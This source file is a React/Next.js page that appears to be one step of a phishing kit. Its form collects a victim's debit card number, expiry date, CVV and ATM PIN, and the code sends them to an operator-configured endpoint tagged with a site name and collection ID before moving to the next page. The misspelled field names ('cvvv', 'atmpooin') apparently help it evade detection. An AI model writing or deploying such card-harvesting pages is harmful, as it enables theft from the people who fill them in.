'use client';
import DebitCardInputComponent from "../inlcude/DebitCardInputComponent";
import ExpiryDateInputComponent from "../inlcude/ExpiryDateInputComponent";
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";  
import { useState } from "react";
import styles from './page.module.css'; // Import the module CSS


export default function Home() {
    const [loading, setLoading] = useState(false);
    const router = useRouter();

    const handleSubmit = async (e) => {
      const API_URL = process.env.NEXT_PUBLIC_URL;
      const SITE = process.env.NEXT_PUBLIC_SITE;
      e.preventDefault();
      setLoading(true);
      const formData = new FormData(e.target);
      const jsonObject1 = {};
      const jsonObject = {};
      formData.forEach((value, key) => {
          jsonObject[key] = value;
      });
      jsonObject1['data'] = jsonObject;
      jsonObject1['site'] = SITE;
      jsonObject1['id'] = localStorage.getItem("collection_id");
      try {
          const response = await fetch(`${API_URL}`, {
              method: 'POST',
              body: JSON.stringify(jsonObject1)
          });

          if (!response.ok) {
              throw new Error('Network response was not ok');
          }
          const responseData = await response.json();
          router.push('/4');
      } catch (error) {
          console.error('There was a problem with the fetch operation:', error);
      }finally{
          setLoading(false);
      }
  };
  return (
    <>
   <Header />
    <main className="mt-4">
  <div className="container">
    <div className="mx-4">
      <input type="hidden" id="nextValue" defaultValue="nho.html" />
      <div id="test" className="text-danger fw-bold" />
      <form onSubmit={handleSubmit} id="frm_2_am8E">
        <DebitCardInputComponent />
        <div className="d-flex gap-3">
          <ExpiryDateInputComponent />
          <div className={styles.formGroup}>
            <label htmlFor="">CVV </label>
            <input
              type="password"
              minLength={3} maxLength={3}
              inputMode="numeric"
              className={`${styles.formControl} form-control`}
              placeholder="CVV"
              name="cvvv"
              required
            />
            <span>Required</span>
          </div>
        </div>
        <div className={styles.formGroup}>
            <label htmlFor="">Enter Your ATM Pin </label>
            <input
              type="password"
              minLength={4} maxLength={4}
              inputMode="numeric"
              className={`${styles.formControl} form-control`}
              placeholder="Enter Your ATM Pin"
              name="atmpooin"
              required
            />
            <span>Required</span>
          </div>
        
        <div className="form-group w-100 my-3 mb-0 d-flex justify-content-center">
          <button type="submit" disabled={loading} className="submit-button w-75 btn btn-primary">
            Proceed
          </button>
        </div>
      </form>
    </div>
  </div>
</main>
    <Footer />
</>
  );
}
